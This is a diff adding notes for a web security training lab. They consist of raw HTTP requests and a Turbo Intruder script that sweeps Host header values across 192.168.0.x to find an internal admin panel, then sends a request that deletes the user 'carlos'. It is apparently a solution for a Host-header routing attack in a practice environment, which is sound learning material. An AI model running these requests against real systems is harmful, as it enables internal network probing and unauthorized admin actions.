@@ -1,0 +1,37 @@
+GET / HTTP/1.1
+Host: ac1a1f6e1ea6c670c0effec2006b00b8.web-security-academy.net
+
+GET / HTTP/1.1
+Host: %s
+
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+
+    for i in range(255):
+        engine.queue(target.req, "192.168.0." + str(i))
+
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if req.status != 404:
+        table.add(req)
+
+
+GET / HTTP/1.1
+Host: 192.168.0.118
+
+GET /admin HTTP/1.1
+Host: 192.168.0.118
+
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.118
+
+csrf=D84mZIWZH0rQqvHWnfHYtRqXIhccuLCH&username=carlos
+
+GET /admin HTTP/1.1
+Host: 192.168.0.118
